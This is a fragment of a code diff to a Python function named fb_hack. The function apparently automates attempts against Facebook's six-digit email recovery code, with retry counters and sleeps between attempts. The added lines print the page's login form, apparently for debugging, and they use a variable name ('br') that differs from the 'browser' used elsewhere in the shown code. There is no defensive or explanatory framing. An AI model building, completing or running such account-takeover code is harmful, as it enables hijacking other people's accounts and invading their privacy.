@@ -79,6 +79,9 @@ def fb_hack(email, codex):
         response1 = browser.response()
         soup = BeautifulSoup(response1, 'html.parser')
         soup.find(string="Please check your email for a message with your code. Your code is 6 numbers long.")
+        forms = list(br.forms())
+        form = forms[0]
+        print(form)        
         if check1 != test:
           sleepy(30)
           attempt1 += 1
@@ -102,6 +105,9 @@ def fb_hack(email, codex):
         response1 = browser.response()
         soup = BeautifulSoup(response1, 'html.parser')
         soup.find(string="Please check your email for a message with your code. Your code is 6 numbers long.")
+        forms = list(br.forms())
+        form = forms[0]
+        print(form)
         if check1 != test:
           sleepy(30)
           attempt1 += 1
